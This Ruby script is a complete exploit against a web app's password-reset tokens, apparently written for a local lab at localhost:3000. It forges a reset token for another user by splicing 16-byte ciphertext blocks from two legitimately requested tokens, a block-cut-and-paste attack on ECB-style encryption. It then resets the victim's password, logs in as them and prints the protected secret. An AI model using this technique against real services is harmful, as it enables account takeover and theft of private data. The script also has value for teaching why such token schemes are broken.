#!/usr/bin/env ruby

require 'base64'
require 'uri'
require 'mechanize'

class Token
  def initialize(encoded_token)
    @data = Base64.urlsafe_decode64(URI.unescape(encoded_token))
  end

  def blocks
    @data.bytes.each_slice(16).map { |bytes| bytes.map(&:chr).join }
  end

  def to_s
    @data
  end
end

def prompt(message)
  puts message
  gets.strip
end


# We want the ciphertext for the following plaintext
# We know it gets sliced into 128bit (16 byte) chunks
#                  |                  |
# email=j.osterman | @watchmen.net&ex | pires=1409357437
#                  |                  |

# Token for email=j.osterman@batchmen.net, take the first 16 bytes of this
first_token = Token.new(prompt("Paste the password reset token for 'j.osterman@batchmen.net' and hit enter:"))

# Token for email=n.osterman@watchmen.net, take all but the first block of this
second_token = Token.new(prompt("Same again for 'n.osterman@watchmen.net' please:"))

new_token = (Array(first_token.blocks.first) + second_token.blocks[1..-1]).join

token = URI.escape(Base64.urlsafe_encode64(new_token))

# Got our token, now let's change j.ostermans password
url      = "http://localhost:3000/password_reset/new?token=#{token}"
email    = 'j.osterman@watchmen.net'
password = '123456789'

Mechanize.new.instance_eval do
  # Access the password reset form with the generated token
  get "http://localhost:3000/password_reset/new?token=#{token}"

  # Submit the form with a new password
  page.forms.first.tap do |f|
    f['user[password]']              = password
    f['user[password_confirmation]'] = password
    f.submit
  end

  # Login with the new password
  page.forms.first.tap do |f|
    f['email']    = email
    f['password'] = password
    f.submit
  end

  # Extract the secret from the page
  puts page.search('.secret').text.strip
end
